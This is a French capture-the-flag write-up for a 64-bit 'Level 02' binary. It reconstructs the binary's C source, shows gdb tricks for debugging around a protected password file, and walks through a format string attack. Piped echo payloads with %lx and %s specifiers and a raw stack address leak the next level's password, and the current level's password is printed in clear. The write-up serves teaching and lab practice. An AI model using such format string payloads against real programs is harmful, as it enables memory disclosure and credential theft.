# Level 02

## Analyse du binaire

Lorsqu'on exécute le binaire un username puis un mot de passe est attendu sur l'entrée standard.

On remarque que l'architecture pour laquelle a été conçue le binaire est différente de tous les exercices précédents. En effet il s'agit ici d'une architecture 64 bits **amd64** et non plus **i386**.
Le code asm va donc différer un peu. Les registres 64 bits font leurs apparitions :

| 64 bits registers | Lower 32 bits | Lower 16 bits | Lower 8 bits |
| ----------------- | ------------- | ------------- | ------------ |
| rax               | eax           | ax            | al           |
| rbx               | ebx           | bx            | bl           |
| rcx               | ecx           | cx            | cl           |
| rdx               | edx           | dx            | dl           |
| rsi               | esi           | si            | sil          |
| rdi               | edi           | di            | dil          |
| rbp               | ebp           | bp            | bpl          |
| rsp               | esp           | sp            | spl          |
| r8                | r8d           | r8w           | r8b          |
| r9                | r9d           | r9w           | r9b          |
| r10               | r10d          | r10w          | r10b         |
| r11               | r11d          | r11w          | r11b         |
| r12               | r12d          | r12w          | r12b         |
| r13               | r13d          | r13w          | r13b         |
| r14               | r14d          | r14w          | r14b         |
| r15               | r15d          | r15w          | r15b         |

Les _calling conventions_ sont aussi différentes. De [wikipedia](https://en.wikipedia.org/wiki/X86_calling_conventions#x86-64_calling_conventions) :

```
The first six integer or pointer arguments are passed in registers RDI, RSI, RDX, RCX, R8, R9 (R10 is used as a static chain pointer in case of nested functions),
while XMM0, XMM1, XMM2, XMM3, XMM4, XMM5, XMM6 and XMM7 are used for the first floating point arguments.
As in the Microsoft x64 calling convention, additional arguments are passed on the stack.

```

## Réécriture du code source

On peut réécrire en C un code source :

```c
int main(int argc, const char **argv)
{
	char *password[96];		 // rbp-0x110
	char *password_file[40]; // rbp-0xa0
	char *username[96];		 // rbp-0x70
	int tmp;				 // rbp-0xc
	FILE *file;				 // rbp-0x8

	bzero(username, 96);	  // not really a call to bzero function
	bzero(password_file, 40); // not really a call to bzero function
	bzero(password, 96);	  // not really a call to bzero function

	file = NULL;
	tmp = 0;
	file = fopen("/home/users/level03/.pass", "r");
	if (!file)
	{
		fwrite("ERROR: failed to open password file\n", 1, 36, stderr);
		exit(1);
	}
	tmp = fread(password_file, 1, 41, file);

	int res = strcspn(password_file, "\n");
	password_file[res] = '\0';

	if (tmp != 41)
	{
		fwrite("ERROR: failed to read password file\n", 1, 36, stderr);
		fwrite("ERROR: failed to read password file\n", 1, 36, stderr);
		exit(1);
	}
	fclose(file);

	puts("===== [ Secure Access System v1.0 ] =====");
	puts("/***************************************\\");
	puts("| You must login to access this system. |");
	puts("\**************************************/");

	printf("--[ Username: ");
	fgets(username, 100, stdin);
	int res = strcspn(username, "\n");
	username[res] = '\0';

	printf("--[ Password: ");
	fgets(password, 100, stdin);
	int res = strcspn(password, "\n");
	password[res] = '\0';

	puts("*****************************************");

	if (strncmp(password_file, password, 41))
	{
		printf(username);
		puts(" does not have access!");
		exit(1);
	}

	printf("Greetings, %s!\n", username);
	system("/bin/sh");
	return 0;
}
```

## Débuguer le programme

Le binaire ouvrant et lisant le mot de passe de level03, il est difficile d'utiliser un débugueur puisqu'il n'a donc pas les droits sur ce fichier. Pour pouvoir débuguer un minimum, on peut lors de la lecture utiliser comme fichier l'entrée standard à la place du mot de passe. Pour ce faire il faut utiliser les commandes suivantes dans gdb :

Dans un premier temps on place les breakpoints où l'on veut. Par exemple, juste après le 2e _fgets_ :

```gdb
b *0x400a24
```

- On place deux breakpoints, un à la suite de _fopen_, un avant l'appel de _fclose_. Puis on run le programme.

```gdb
b *0x4008ad
b *0x400981
```

- Au breakpoint `0x4008ad`, on modifie la valeur de retour de _fopen_, pour lui assigner _stdin_ :

```gdb
set $rax = 0x00007ffff7dd4340
```

- Un input est attendu sur l'entrée standard, comme il y aura une vérification sur la longueur du mot de passe on peut utiliser le mot de passe du level actuel : `PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv` ou toute chaîne de caractères ayant au moins 41 caractères.

- Au breakpoint `0x400981`, on modifie le 1er argument de la fonction _fclose_ :

```gdb
set $rax = 0x00007ffff7dd4180
```

## Exploitation

On peut penser au début que la faille vient de la comparaison entre le mot de passe entré et le mot de passe récupéré depuis le fichier :

```c
strncmp(password_file, password, 41)
```

Cependant, tous les buffers alloués possèdent la bonne taille et ils sont protégés. On ne peut donc pas utiliser de **buffer overflow** pour modifier le mot de passe provenant du fichier et ensuite accéder au shell lancé par la commande système.

Cependant, on remarque juste après que cette comparaison ait échouée un appel à la fonction _printf_ avec comme argument le buffer _username_ :

```c
printf(username);
```

On peut donc utiliser une **format string attack**.

Comme le mot de passe est lu et stocké dans une variable, il faudrait juste pouvoir afficher cette variable pour obtenir notre mot de passe.

En utilisant la commande :

```bash
(echo "%lx %lx %lx %lx %lx %lx %lx %lx %lx"; echo "passwd") | ./level02
```

on obtient :

```
7fffffffe3d0 0 70 2a2a2a2a2a2a2a2a 2a2a2a2a2a2a2a2a 7fffffffe5c8 1f7ff9a08 647773736170 0 does not have access!
```

Avec gdb, en s'arrêtant juste avant l'appel à la fonction _printf_, on peut voir le contenu des registres :

```
RAX: 0x0
RBX: 0x0
RCX: 0x70 ('p')
RDX: 0x0
RSI: 0x7fffffffe390 --> 0x647773736170 ('passwd')
RDI: 0x7fffffffe430 --> 0x786c25 ('%lx')
RBP: 0x7fffffffe4a0 --> 0x0
RSP: 0x7fffffffe380 --> 0x7fffffffe588 --> 0x7fffffffe7ef ("/home/users/level02/level02")
RIP: 0x400aa2 (<main+654>:      call   0x4006c0 <printf@plt>)
R8 : 0x2a2a2a2a2a2a2a2a ('********')
R9 : 0x2a2a2a2a2a2a2a2a ('********')
R10: 0x7fffffffe110 --> 0x0
```

et de la stack :

```
0000| 0x7fffffffe380 --> 0x7fffffffe588 --> 0x7fffffffe7ef ("/home/users/level02/level02")
0008| 0x7fffffffe388 --> 0x1f7ff9a08
0016| 0x7fffffffe390 --> 0x647773736170 ('passwd')
0024| 0x7fffffffe398 --> 0x0
```

On remarque bien la correspondance entre les paramètres et les registres / la stack. Les adresses `7fffffffe3d0 0 70 2a2a2a2a2a2a2a2a 2a2a2a2a2a2a2a2a` correspondent respectivement aux registres `RSI RDX RCX R8 R9`. Les adresses `7fffffffe5c8 1f7ff9a08 647773736170 0` correspondent aux premiers éléments de la stack.

On remarque donc que notre mot de passe est dans la stack et donc qu'on peut le réutiliser. On le vérifie :

```bash
(echo "%s %lx %lx %lx %lx %lx %lx %lx %lx"; echo "AAAAAAAAA") | ./level02
```

```
AAAAAAAAA 0 41 2a2a2a2a2a2a2a2a 2a2a2a2a2a2a2a2a 7fffffffe5c8 1f7ff9a08 4141414141414141 41 does not have access!
```

On peut donc insérer l'adresse de la variable où est stocké le mot de passe du level03 et l'afficher. L'adresse de cette variable est `0x7fffffffe400`. Cependant on a vu précédement que l'adresse du mot de passe entré par l'utilisateur est différente selon si on exécute le binaire via le débugueur ou non.
On avait dans le débugueur l'adresse `0x7fffffffe390` et l'adresse affichée `0x7fffffffe3d0`. En faisant la différence des deux on obtient 0x40 (hex) ou 64 (dec).
En ajoutant cette différence à notre adressse on obtient `0x7fffffffe400 + 0x40 = 0x7f ffffffe440`.

Finalement on peut utiliser la commande suivante pour afficher le mot de passe de l'utilisateur level03 :

```bash
(echo "%lx %lx %lx %lx %lx %lx %lx %s %lx"; echo -e "\x40\xe4\xff\xff\xff\x7f") | ./level02
```
